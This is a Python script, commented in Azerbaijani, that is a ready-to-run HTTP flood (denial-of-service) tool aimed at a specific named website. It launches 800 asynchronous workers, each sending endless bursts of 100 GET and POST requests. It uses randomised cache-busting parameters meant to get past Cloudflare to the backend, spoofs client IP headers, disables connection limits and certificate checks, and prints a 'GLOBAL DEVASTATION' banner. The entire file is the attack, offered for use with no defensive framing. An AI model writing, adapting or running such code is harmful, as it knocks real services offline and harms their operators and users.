import asyncio
import httpx
import random
import time
import string

TARGET_URL = "https://streamwin.win"
# Asinxron işlədiyi üçün 1500 worker rahatlıqla işləyəcək
WORKERS = 800 

def r_str(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def fatal_strike(worker_id, client):
    while True:
        try:
            # Serveri bazadan vurmaq üçün ağır API parametrləri
            # Bu müraciətlər Cloudflare-i dəlib keçib birbaşa backend-i yorur
            url = f"{TARGET_URL}?invite_code={random.randint(1000, 9999)}&ttclid=E_C_P_{r_str(40)}&s={r_str(60)}"
            
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,5)}.0.0.0",
                "Accept-Encoding": "gzip, deflate, br",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}",
                "X-Requested-With": "XMLHttpRequest",
                "Connection": "keep-alive"
            }

            # Burst Mode: Hər worker eyni anda 100 paket partladır
            tasks = []
            for _ in range(100):
                # SERVERİN RAM-ını kilitləyən ağır POST
                if _ % 5 == 0:
                    tasks.append(client.post(url, headers=headers, content=r_str(1500)))
                # SERVERİN CPU-sunu kilitləyən GET
                else:
                    tasks.append(client.get(url, headers=headers))
            
            # Dalğanı serverin prosessoruna çırp!
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception:
            await asyncio.sleep(0.01)

async def main():
    print(f"💀 GLOBAL DEVASTATION MODE ACTIVE: {TARGET_URL}")
    print("[!] Target Origin is being saturated. 520 Status expected.")
    
    # TCP hüdudlarını və bağlantı limitlərini ləğv edirik
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    async with httpx.AsyncClient(
        http2=True, # HTTP/2 Rapid Reset effekti (MÜTLƏQDİR)
        verify=False, 
        limits=limits, 
        timeout=10.0
    ) as client:
        
        workers = [fatal_strike(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
